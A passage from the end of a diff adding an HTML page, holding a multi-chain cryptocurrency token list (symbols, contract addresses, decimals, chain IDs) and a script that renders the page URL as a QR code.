+{ symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18, chainId: 1 },
+{ symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18, chainId: 1 },
+{ symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18, chainId: 1 },
+{ symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18, chainId: 1 },
+{ symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18, chainId: 1 },
+{ symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", decimals: 18, chainId: 1 },
+{ symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8, chainId: 1 },
+{ symbol: "COMP", address: "0xc00e94Cb662C3520282E6f5717214004A7f26888", decimals: 18, chainId: 1 },
+{ symbol: "CRV", address: "0xD533a949740bb3306d119CC777fa900bA034cd52", decimals: 18, chainId: 1 },
+{ symbol: "BAT", address: "0x0D8775F648430679A709E98d2b0Cb6250d2887EF", decimals: 18, chainId: 1 },
+{ symbol: "SUSHI", address: "0x6B3595068778DD592e39A122f4f5a5cF09C90fE2", decimals: 18, chainId: 1 },
+{ symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18, chainId: 56 },
+{ symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18, chainId: 56 },
+{ symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18, chainId: 56 },
+{ symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18, chainId: 56 },
+{ symbol: "ALPACA", address: "0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F", decimals: 18, chainId: 56 },
+{ symbol: "BTCB", address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals: 18, chainId: 56 },
+{ symbol: "XVS", address: "0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63", decimals: 18, chainId: 56 },
+{ symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18, chainId: 56 },
+{ symbol: "UNI", address: "0xBf5140A22578168FD562DCcF235E5D43A02ce9B1", decimals: 18, chainId: 56 },
+{ symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6, chainId: 137 },
+{ symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99a7a9449Aa84174", decimals: 6, chainId: 137 },
+{ symbol: "WMATIC", address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", decimals: 18, chainId: 137 },
+{ symbol: "WETH", address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", decimals: 18, chainId: 137 },
+{ symbol: "DAI", address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", decimals: 18, chainId: 137 },
+{ symbol: "BAL", address: "0x9a71012B13CA4d3D0Cdc72A177DF3ef03b0E76A3", decimals: 18, chainId: 137 },
+{ symbol: "QI", address: "0x580A84C73811E1839F75d86d75d88cCa0c241fF4", decimals: 18, chainId: 137 },
+{ symbol: "AMPL", address: "0xc67238827da94B15F6bA10F3d35f690809919F75", decimals: 18, chainId: 137 },
+{ symbol: "USDC", address: "0xaf88d065e77c8cc2239301c5e016f019b175484b", decimals: 6, chainId: 42161 },
+{ symbol: "USDC.e", address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", decimals: 6, chainId: 42161 },
+{ symbol: "WETH", address: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", decimals: 18, chainId: 42161 },
+{ symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85EBE478A1C0b69FCbb9", decimals: 6, chainId: 42161 },
+{ symbol: "GMX", address: "0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a", decimals: 18, chainId: 42161 },
+{ symbol: "ARB", address: "0x912CE59144191C1204E64559FE8253a0e49E6548", decimals: 18, chainId: 42161 },
+{ symbol: "FRAX", address: "0x17FC002b466eEc40DaE837Fc4bE5c884515b0F7e", decimals: 18, chainId: 42161 },
+{ symbol: "USDC", address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", decimals: 6, chainId: 10 },
+{ symbol: "USDT", address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6, chainId: 10 },
+{ symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18, chainId: 10 },
+{ symbol: "DAI", address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", decimals: 18, chainId: 10 },
+{ symbol: "OP", address: "0x4200000000000000000000000000000000000042", decimals: 18, chainId: 10 },
+{ symbol: "wstETH", address: "0x1F32b1c2345538c0c6f582fCB022739c4A194Ebb", decimals: 18, chainId: 10 },
+{ symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6, chainId: 43114 },
+{ symbol: "USDT.e", address: "0xc7198437980c041c805A1EDcbA50c1Ce5db95118", decimals: 6, chainId: 43114 },
+{ symbol: "WAVAX", address: "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7", decimals: 18, chainId: 43114 },
+{ symbol: "WETH.e", address: "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB", decimals: 18, chainId: 43114 },
+{ symbol: "LINK", address: "0x5947BB275c521040051D82396192181b413227A3", decimals: 18, chainId: 43114 },
+{ symbol: "JOE", address: "0x6e84a6216eA6dACC71eE8E6b0a5B7322EEbC0fDd", decimals: 18, chainId: 43114 }
+];
+
+// GENERAR QR AUTOMÁTICO
+document.addEventListener('DOMContentLoaded', () => {
+    const urlToQR = window.location.href;
+    if (typeof QRCode !== 'undefined') {
+        new QRCode(document.getElementById("qrcode"), {
+            text: urlToQR,
+            width: 128,
+            height: 128,
+            colorDark : "#000000",
+            colorLight : "#ffffff",
+            correctLevel : QRCode.CorrectLevel.H
+        });
+    }
+});
+</script>
+
+</body>
+</html>
